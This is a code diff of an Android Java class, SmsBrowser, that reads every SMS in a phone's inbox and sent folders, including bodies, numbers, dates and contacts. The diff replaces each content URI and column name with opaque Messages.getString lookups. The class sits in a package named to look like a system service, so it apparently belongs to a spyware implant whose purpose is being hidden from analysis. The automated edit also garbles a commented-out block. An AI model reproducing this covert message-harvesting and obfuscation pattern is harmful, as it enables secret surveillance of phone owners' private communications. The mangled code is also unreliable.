@@ -14,13 +14,14 @@ import java.util.ArrayList;
 import android.database.Cursor;
 import android.net.Uri;
 
+import com.android.service.Messages;
 import com.android.service.Sms;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
 
 public class SmsBrowser {
-	private static final String TAG = "SmsBrowser";
+	private static final String TAG = "SmsBrowser"; //$NON-NLS-1$
 
 	private final ArrayList<Sms> list;
 
@@ -31,8 +32,8 @@ public class SmsBrowser {
 	public ArrayList<Sms> getSmsList() {
 		list.clear();
 
-		parse("content://sms/inbox", Sms.RECEIVED);
-		parse("content://sms/sent", Sms.SENT);
+		parse(Messages.getString("14.0"), Sms.RECEIVED); //$NON-NLS-1$
+		parse(Messages.getString("14.1"), Sms.SENT); //$NON-NLS-1$
 
 		return list;
 	}
@@ -54,13 +55,13 @@ public class SmsBrowser {
 
 			// These fields are needed
 			try {
-				body = c.getString(c.getColumnIndexOrThrow("body")).toString();
-				number = c.getString(c.getColumnIndexOrThrow("address")).toString();
-				date = Long.parseLong(c.getString(c.getColumnIndexOrThrow("date")).toString());
+				body = c.getString(c.getColumnIndexOrThrow(Messages.getString("14.2"))).toString(); //$NON-NLS-1$
+				number = c.getString(c.getColumnIndexOrThrow(Messages.getString("14.3"))).toString(); //$NON-NLS-1$
+				date = Long.parseLong(c.getString(c.getColumnIndexOrThrow(Messages.getString("14.4"))).toString()); //$NON-NLS-1$
 				sentStatus = sentState;
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
-					Check.log(e);
+					Check.log(e) ;//$NON-NLS-1$
 				}
 				c.close();
 				return;
@@ -70,90 +71,90 @@ public class SmsBrowser {
 
 			// These fields are optional
 			try {
-				final int yields_id = c.getColumnIndexOrThrow("yields _id");
+				final int yields_id = c.getColumnIndexOrThrow(Messages.getString("14.5")); //$NON-NLS-1$
 				s.setYieldsId(yields_id);
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (parse): " + e);
+					Check.log(TAG + " (parse): " + e) ;//$NON-NLS-1$
 				}
 			}
 
 			try {
-				final int thread_id = c.getColumnIndexOrThrow("thread_id");
+				final int thread_id = c.getColumnIndexOrThrow(Messages.getString("14.6")); //$NON-NLS-1$
 				s.setThreadId(thread_id);
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (parse): " + e);
+					Check.log(TAG + " (parse): " + e) ;//$NON-NLS-1$
 				}
 			}
 
 			try {
-				final String person = c.getString(c.getColumnIndexOrThrow("person")).toString();
+				final String person = c.getString(c.getColumnIndexOrThrow(Messages.getString("14.7"))).toString(); //$NON-NLS-1$
 				s.setPerson(person);
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (parse): " + e);
+					Check.log(TAG + " (parse): " + e) ;//$NON-NLS-1$
 				}
 			}
 
 			try {
-				final int protocol = c.getColumnIndexOrThrow("protocol");
+				final int protocol = c.getColumnIndexOrThrow(Messages.getString("14.8")); //$NON-NLS-1$
 				s.setProtocol(protocol);
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (parse): " + e);
+					Check.log(TAG + " (parse): " + e) ;//$NON-NLS-1$
 				}
 			}
 
 			try {
-				final int read = c.getColumnIndexOrThrow("read");
+				final int read = c.getColumnIndexOrThrow(Messages.getString("14.9")); //$NON-NLS-1$
 				s.setRead(read);
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (parse): " + e);
+					Check.log(TAG + " (parse): " + e) ;//$NON-NLS-1$
 				}
 			}
 
 			try {
-				final int status = c.getColumnIndexOrThrow("status");
+				final int status = c.getColumnIndexOrThrow(Messages.getString("14.10")); //$NON-NLS-1$
 				s.setStatus(status);
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (parse): " + e);
+					Check.log(TAG + " (parse): " + e) ;//$NON-NLS-1$
 				}
 			}
 
 			try {
-				final int type = c.getColumnIndexOrThrow("type");
+				final int type = c.getColumnIndexOrThrow(Messages.getString("14.11")); //$NON-NLS-1$
 				s.setType(type);
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (parse): " + e);
+					Check.log(TAG + " (parse): " + e) ;//$NON-NLS-1$
 				}
 			}
 
 			try {
-				final int reply_path = c.getColumnIndexOrThrow("reply_path_present");
+				final int reply_path = c.getColumnIndexOrThrow(Messages.getString("14.12")); //$NON-NLS-1$
 				s.setReplyPath(reply_path);
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (parse): " + e);
+					Check.log(TAG + " (parse): " + e) ;//$NON-NLS-1$
 				}
 			}
 
 			/*
 			 * try { String subject =
 			 * c.getString(c.getColumnIndexOrThrow("subject")).toString();
-			 * if(AutoConfig.DEBUG) Check.log( "subject: " + test); } catch
-			 * (Exception e) { if(AutoConfig.DEBUG) { Check.log(e); } }
+			 * if(AutoConfig.DEBUG) Check.log( "subject: " + test); } catc ;//$NON-NLS-1$
+			 * (Exception e) { if(AutoConfig.DEBUG) { Check.log(e); }  ;//$NON-NLS-1$
 			 */
 
 			try {
-				final String service_center = c.getString(c.getColumnIndexOrThrow("service_center")).toString();
+				final String service_center = c.getString(c.getColumnIndexOrThrow(Messages.getString("14.13"))).toString(); //$NON-NLS-1$
 				s.setServiceCenter(service_center);
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (parse): " + e);
+					Check.log(TAG + " (parse): " + e) ;//$NON-NLS-1$
 				}
 			}
 
